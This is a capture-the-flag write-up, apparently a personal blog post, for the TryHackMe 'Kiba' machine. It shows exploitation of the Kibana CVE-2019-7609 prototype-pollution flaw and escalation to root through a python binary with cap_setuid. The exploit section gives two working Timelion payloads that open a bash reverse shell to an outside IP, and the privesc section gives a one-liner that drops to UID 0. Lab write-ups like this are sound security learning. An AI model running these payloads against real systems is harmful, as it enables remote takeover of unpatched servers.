---
layout: default
title : m3dsec - Kiba Write-up
---

_**Sep 10, 2020**_

## Overview

quick writeup, explaining 
- Kibana arbitrary code execution flaw, [CVE-2019-7609](https://nvd.nist.gov/vuln/detail/CVE-2019-7609)
- linux capabilities
- how we got full system on [kiba](https://tryhackme.com/room/kiba) machine from [tryhackme](https://tryhackme.com)

## Target Informations

```
TARGET IP ADRESS    : 10.10.153.5
DOMAIN NAME         : kiba.thm
ROOM URL            : https://tryhackme.com/room/kiba
Descriptions        : Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.
```

## External Enumeration

**Port Scaning**

running a simple **nmap** scan against the target host, we get 3 open ports.

```
m3dsec@local:~/kiba.thm$  nmap -sC -sV -oN nmap/namp_tcp_simple 10.10.153.5
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5601/tcp open  esmagent
```

nothing much on port 80, but accessing port **5601** reveal a **Kibana dashboard** version **6.5.4**, which is vulnerable to prototype pollution vulnerability, under [CVE-2019-7609](https://nvd.nist.gov/vuln/detail/CVE-2019-7609).

there is quite good articles out there [explainning](https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability) how a malicious actor can laverage from a normal user, to get a full access into the backend of the application

however the main idea is each time we click on "_convas_", kibana spawn a <ins>new process</ins>, and as long as we have controle over the enviremental variables passed to that new spawned process, we can execute javascript code, that lead us to a Remote Code Execution on the target host


## Exploit

* Open Kibana
* Past one of the following payload into the Timelion visualizer
* Click run
* On the left panel click on Canvas
* Your reverse shell should pop ! :)

Here are some payloads, that we can use.

* payload1 

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.9.123.226/9991 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

* payload 2

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.123.226/9991 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

and we got our foothold on the target as user **kiba**

<br>

## Privilege escalation

quickly after getting in, running getcap command

```
kiba@hostname:~$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
...
```

we can notice that there is a python binary file on the user home directory that got some special capabilities `cap_setuid+ep` that we can abuse to get root on the target system, but 1st

**What are capabilities :**
capabilities are a set of actions that can be used to give only a portion of higher privileges, therefore limit users permission.

**Example :**
Suppose a web server normally runs at port 80 and we also know that we need root permissions to start listening on one of the lower ports (<1024). 
the daemon needs to be able to listen to port 80. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP_NET_BIND_SERVICE. With this specific capability, it can open up port 80 in a much easier way.

in our case, we have `cap_setuid` whish is pretty f#!@up if u ask me, it let us sets the effective user-id of the process to what ever we want.

we can easly get a root shell on the target host, by droping the effective user id to 0 (root UID)

with this simple command:

```
kiba@hostname:~$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id
uid=0(root) gid=0(root) groups=0(root)
```



<br>


## Questions answers

sorry, we don't provide easy response here, u'll need to do the machine by yourself.


<br>

## Some Resources

1. [https://nvd.nist.gov/vuln/detail/CVE-2019-7609](https://nvd.nist.gov/vuln/detail/CVE-2019-7609)
2. [https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability](https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability)
3. [https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)


<br>
Best Regards

[m3dsec](https://twitter.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>
<br>
